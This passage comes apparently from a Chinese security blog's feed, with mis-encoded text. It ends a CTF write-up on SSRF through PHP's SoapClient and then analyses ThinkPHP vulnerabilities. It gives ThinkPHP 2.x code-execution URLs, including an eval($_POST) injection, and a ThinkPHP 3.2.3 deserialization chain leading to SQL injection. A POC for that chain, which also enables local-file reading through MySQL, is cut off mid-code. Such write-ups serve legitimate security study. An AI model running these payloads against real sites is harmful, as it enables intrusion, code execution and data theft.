ä¸€ä¸ªCookieï¼Œå°±èƒ½å¸¦ä¸Šsession.<br>è‡ªå·±çš„PHPSESSIDå°±æ˜¯è®¿é—®<code>/page_admin</code>å¾—åˆ°çš„</p><p>ç”Ÿæˆpocåï¼Œåœ¨<code>/page_admin</code>å¤„POSTæˆ‘ä»¬POCç”Ÿæˆçš„payload</p><p>å°±èƒ½åˆ©ç”¨soapç±»å»è®¿é—®flag.phpä»è€Œå®ç°SSRFæŠŠflagå¸¦åˆ°sessionä¸­ï¼Œæœ€åå¸¦ä¸Šadminå‚æ•°å¹¶å°†sessionæ›¿æ¢æˆè‡ªå·±çš„PHPSESIONå³å¯å¾—åˆ°flag</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images@main/image/202210041232981.png" alt="image-20221004123207895"></p>]]></content>
      
      
      <categories>
          
          <category> phpåŸç”Ÿç±» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phpåŸç”Ÿç±» </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphpå„ç‰ˆæœ¬æ¼æ´åˆ†æåŠä¾‹é¢˜</title>
      <link href="/2021/12/19/Thinkphp%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/"/>
      <url>/2021/12/19/Thinkphp%E5%90%84%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%8F%8A%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="ThinkPHP-2-x-ä»»æ„ä»£ç æ‰§è¡Œ"><a href="#ThinkPHP-2-x-ä»»æ„ä»£ç æ‰§è¡Œ" class="headerlink" title="ThinkPHP 2.x(ä»»æ„ä»£ç æ‰§è¡Œ)"></a>ThinkPHP 2.x(ä»»æ„ä»£ç æ‰§è¡Œ)</h1><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/?s=/Index/index/jammny/$&#123;@phpinfo()&#125;</span><br><span class="line">http://xxx/?s=/Index/index/jammny/$&#123;@print(eval($_POST[1]))&#125;</span><br></pre></td></tr></table></figure><h1 id="Thinkphp3-2-3"><a href="#Thinkphp3-2-3" class="headerlink" title="Thinkphp3.2.3"></a>Thinkphp3.2.3</h1><h2 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h2><p><strong>composer</strong>ä¸€æŠŠæ¢­,å¯å‚è€ƒ<a href="https://gh0st-9.github.io/2021/11/26/Windows%E4%B8%8Bphpstudy%E5%AE%89%E8%A3%85composer%E5%8F%8A%E5%85%B6thinkphp%E5%90%84%E7%89%88%E6%9C%AC/">æ–‡ç« </a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project topthink/thinkphp=3.2.3 tp3</span><br></pre></td></tr></table></figure><p>ä¹‹åè®¿é—®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost/tp3/</span><br></pre></td></tr></table></figure><p>å³å¯</p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>æ‰¾èµ·ç‚¹ï¼Œ<code>\tp3\ThinkPHP\Library\Think\Image\Driver\Imagick.class.php</code></p><p><img src="https://img-blog.csdnimg.cn/3f63862ef70f482e9c9be462a26cd782.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å…¶ä¸­**$this-&gt;img<strong>æ˜¯å¯æ§çš„ï¼Œè°ƒç”¨äº†</strong>destroy**å‡½æ•°ï¼Œè¿™é‡Œå…¨å±€æœç´¢ï¼Œè·Ÿè¿›åˆ°<code>\tp3\ThinkPHP\Library\Think\Session\Driver\Memcache.class.php</code>,</p><p><img src="https://img-blog.csdnimg.cn/70873ffb5d064dcda923860589d36cba.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å…¶ä¸­çš„**$this-&gt;handle<strong>å’Œ</strong>$this-&gt;sessionName<strong>æ˜¯å¯æ§çš„,ç„¶åè°ƒç”¨äº†</strong>delete**å‡½æ•°ï¼Œè·Ÿè¿›åˆ°<code>ThinkPHP/Mode/Lite/Model.class.php</code></p><p><img src="https://img-blog.csdnimg.cn/937536a6d41b4b12b9ed7ab1ac3e53a1.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è°ƒç”¨äº†<strong>getPk</strong>å‡½æ•°</p><p><img src="https://img-blog.csdnimg.cn/02aa31995b6b45b3b688518cf76b20de.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><strong>$this-&gt;pk</strong>å¯æ§ï¼Œæ‰€ä»¥**$pk**æ˜¯å¯æ§çš„ï¼Œæ¥ç€çœ‹ä¸‹é¢</p><p><img src="https://img-blog.csdnimg.cn/b39eef92507b47ebae9efc85fdc1fe54.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å†æ¬¡è°ƒç”¨<strong>delete</strong>å‡½æ•°,è¿™æ¬¡è·Ÿè¿›åˆ°<code>ThinkPHP/Library/Think/Db/Driver.class.php</code></p><p><img src="https://img-blog.csdnimg.cn/73b5e5800c62482f8486814f77d535e4.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å…³é”®çš„æ˜¯è¿™æ®µä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$table</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseTable</span>(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]);</span><br><span class="line"><span class="variable">$sql</span>   = <span class="string">&#x27;DELETE FROM &#x27;</span> . <span class="variable">$table</span>;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$sql</span>, !<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;fetch_sql&#x27;</span>]) ? <span class="literal">true</span> : <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p><strong>$sql</strong>æ˜¯ç”±**â€™DELETE FROM â€˜<strong>ä¸</strong>$table<strong>æ‹¼æ¥è€Œæ¥çš„ï¼Œè€Œ</strong>$table<strong>ç­‰äºçš„æ˜¯è°ƒç”¨äº†</strong>parseTable**æ–¹æ³•åçš„å€¼</p><p>è·Ÿè¿›<strong>parseTable</strong>æ–¹æ³•</p><p><img src="https://img-blog.csdnimg.cn/0eee7cdb4a684f389409747b8f3fac32.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è°ƒç”¨äº†<strong>parseKey</strong>æ–¹æ³•ï¼Œè·Ÿè¿›</p><p><img src="https://img-blog.csdnimg.cn/84ebcabf1b044f0184a20a9a1cf37b2a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç›´æ¥è¿”å›**$key<strong>ï¼Œé€€å›åˆ°<code>ThinkPHP/Library/Think/Db/Driver.class.php</code>ä¸­çš„</strong>delete**æ–¹æ³•</p><p>æœ€åè°ƒç”¨äº†<strong>execute</strong>æ–¹æ³•å¯¹**$sql**è¿›è¡Œå¤„ç†</p><p><img src="https://img-blog.csdnimg.cn/918fcda2f0344afa852db8f80c2a483b.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è·Ÿè¿›ä¸€ä¸‹</p><p><img src="https://img-blog.csdnimg.cn/bcba9ca8f977490594b9ce3d9e89aab4.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è°ƒç”¨äº†<strong>initConnect</strong>æ–¹æ³•ï¼Œè·Ÿè¿›</p><p><img src="https://img-blog.csdnimg.cn/40175316603e4888946b6def6d9d8c67.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_18,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è°ƒç”¨äº†<strong>connect</strong>å‡½æ•°ï¼Œè·Ÿè¿›</p><p><img src="https://img-blog.csdnimg.cn/3f9cd888cb0c40b2b0a541b9a217d93e.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¿™é‡Œä½¿ç”¨äº†**$this-&gt;config<strong>å»åˆ›å»ºæ•°æ®åº“çš„è¿æ¥ï¼Œæ‰€ä»¥åœ¨</strong>mysql**ç±»ä¸‹é…ç½®å¥½æ•°æ®åº“çš„é…ç½®å³å¯</p><p><img src="https://img-blog.csdnimg.cn/e6ee35f789194e2dac653c48cda46054.png?x-os-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVExfX2dob3N0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æ¢³ç†ä¸€ä¸‹æ€è·¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ThinkPHP/Mode/Lite/Model.class.php</span></span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">protected</span> <span class="variable">$pk</span> = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">...</span><br><span class="line"><span class="variable">$pk</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getPk</span>();    </span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">delete</span>(<span class="variable">$this</span>-&gt;data[<span class="variable">$pk</span>]);<span class="comment">//$pkå¯æ§ï¼Œ$this-&gt;dataå¯æ§ï¼Œæ‰€ä»¥$this-&gt;data[$pk]å¯æ§</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//ThinkPHP/Library/Think/Db/Driver.class.php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params"><span class="variable">$options</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)//è¿™é‡Œçš„$<span class="title">options</span>å°±æ˜¯ä¸Šé¢çš„$<span class="title">this</span>-&gt;<span class="title">data</span>[$<span class="title">pk</span>]ï¼Œå¯æ§</span></span><br><span class="line"><span class="function">$<span class="title">table</span> = $<span class="title">this</span>-&gt;<span class="title">parseTable</span>(<span class="params"><span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]</span>)</span>;</span><br><span class="line"><span class="variable">$sql</span>   = <span class="string">&#x27;DELETE FROM &#x27;</span> . <span class="variable">$table</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">execute</span>(<span class="variable">$sql</span>, !<span class="keyword">empty</span>(<span class="variable">$options</span>[<span class="string">&#x27;fetch_sql&#x27;</span>]) ? <span class="literal">true</span> : <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseTable</span>(<span class="params"><span class="variable">$tables</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$tables</span>)) &#123;</span><br><span class="line"><span class="comment">// æ”¯æŒåˆ«åå®šä¹‰</span></span><br><span class="line">            <span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$tables</span> <span class="keyword">as</span> <span class="variable">$table</span> =&gt; <span class="variable">$alias</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$table</span>)) &#123;</span><br><span class="line">                    <span class="variable">$array</span>[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$table</span>) . <span class="string">&#x27; &#x27;</span> . <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$alias</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$array</span>[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$alias</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$tables</span> = <span class="variable">$array</span>;</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$tables</span>)) &#123;</span><br><span class="line">            <span class="variable">$tables</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$tables</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_walk</span>(<span class="variable">$tables</span>, <span class="keyword">array</span>(&amp;<span class="variable">$this</span>, <span class="string">&#x27;parseKey&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$tables</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"> <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseKey</span>(<span class="params">&amp;<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å¯¹äºæ•´ä¸ªæ‰§è¡Œè¿‡ç¨‹å¯ä»¥çœ‹ä¸‹é¢çš„ä¾‹å­ï¼Œå¾ˆå¥½æ‡‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">wind</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$pk</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$pk</span> = <span class="variable language_">$this</span>-&gt;pk;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">delete</span>(<span class="variable">$this</span>-&gt;data[<span class="variable">$pk</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">delete</span>(<span class="params"><span class="variable">$options</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>) //è¿™é‡Œçš„$<span class="title">options</span>å°±æ˜¯ä¸Šé¢çš„$<span class="title">this</span>-&gt;<span class="title">data</span>[$<span class="title">pk</span>]ï¼Œå¯æ§</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$table</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseTable</span>(<span class="variable">$options</span>[<span class="string">&#x27;table&#x27;</span>]);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$table</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="variable language_">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;test sql&quot;</span>,</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseKey</span>(<span class="params">&amp;<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parseTable</span>(<span class="params"><span class="variable">$tables</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$tables</span>)) &#123;</span><br><span class="line"><span class="comment">// æ”¯æŒåˆ«åå®šä¹‰</span></span><br><span class="line">            <span class="variable">$array</span> = <span class="keyword">array</span>();</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable">$tables</span> <span class="keyword">as</span> <span class="variable">$table</span> =&gt; <span class="variable">$alias</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$table</span>)) &#123;</span><br><span class="line">                    <span class="variable">$array</span>[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$table</span>) . <span class="string">&#x27; &#x27;</span> . <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$alias</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$array</span>[] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">parseKey</span>(<span class="variable">$alias</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$tables</span> = <span class="variable">$array</span>;</span><br><span class="line">            <span class="title function_ invoke__">print_r</span>(<span class="variable">$tables</span>);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$tables</span>)) &#123;</span><br><span class="line">            <span class="variable">$tables</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$tables</span>);</span><br><span class="line">            <span class="title function_ invoke__">array_walk</span>(<span class="variable">$tables</span>, <span class="keyword">array</span>(&amp;<span class="variable">$this</span>, <span class="string">&#x27;parseKey&#x27;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$tables</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">wind</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;<span class="title function_ invoke__">test</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¾“å‡ºç»“æœï¼š</span></span><br><span class="line"><span class="keyword">string</span>(<span class="number">8</span>) <span class="string">&quot;test sql&quot;</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;data[<span class="variable language_">$this</span>-&gt;pk] = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;table&quot;</span> =&gt; <span class="string">&quot;name where 1=updatexml(1,user(),1)#&quot;</span>,</span><br><span class="line">                <span class="string">&quot;where&quot;</span> =&gt; <span class="string">&quot;1=1&quot;</span></span><br></pre></td></tr></table></figure><p>æ¥è¿›è¡ŒæŠ¥é”™æ³¨å…¥</p><p>æœ€åçš„POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//åˆå§‹åŒ–æ•°æ®åº“è¿æ¥</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">PDO</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mysql</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span> = <span class="keyword">array</span>(</span><br><span class="line">            PDO::<span class="variable constant_">MYSQL_ATTR_LOCAL_INFILE</span> =&gt; <span class="literal">true</span>    <span class="comment">// å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶</span></span><br><span class="line">        );</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$config</span> = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>    =&gt; <span class="number">1</span>,</span><br><span class="line">            <span class="string">&quot;database&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,<span class="comment">//æ•°æ®åº“å</span></span><br><span class="line">            <span class="string">&quot;hostname&quot;</span> =&gt; <span class="string">&quot;127.0.0.1&quot;</span>,<span class="comment">//åœ°å€</span></span><br><span class="line">            <span class="string">&quot;hostport&quot;</span> =&gt; <span class="string">&quot;3306&quot;</span>,<span class="comment">//ç«¯å£</span></span><br><span class="line">            <span class="string">&quot;charset&quot;</span>  =&gt; <span class="string">&quot;utf8&quot;</span>,</span><br><span class="line">            <span class="string">&quot;username&quot;</span> =&gt; <span class="string">&quot;root&quot;</span>,<span class="comment">//ç”¨æˆ·å</span></span><br><span class="line">            <span class="string">&quot;password&quot;</span> =&gt; <span class="string">&quot;root&quot;</span><span class="comment">//å¯†ç </span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Image</span>\<span class="title class_">Driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Session</span>\<span class="title class_">Driver</span>\<span class="title class_">Memcache</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Imagick</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$img</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;img = <span class="keyword">new</span> <span class="title class_">Memcache</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>\<span class="title class_">Session</span>\<span class="title class_">Driver</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Model</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Memcache</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$handle</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle = <span class="keyword">new</span> <span class="title class_">Model</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Think</span>&#123;</span><br><span class="line">    <span class="title class_">use</span> <span class="title class_">Think</span>\<span class="title class_">Db</span>\<span class="title class_">Driver</span>\<span class="title class_">Mysql</span>;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$options</span>   = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$pk</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$db</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">Mysql</span>();</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;options[<span class="string">&#x27;where&#x27;</span>] = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;pk = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;data[<span class="variable language_">$this</span>-&gt;pk] = <span 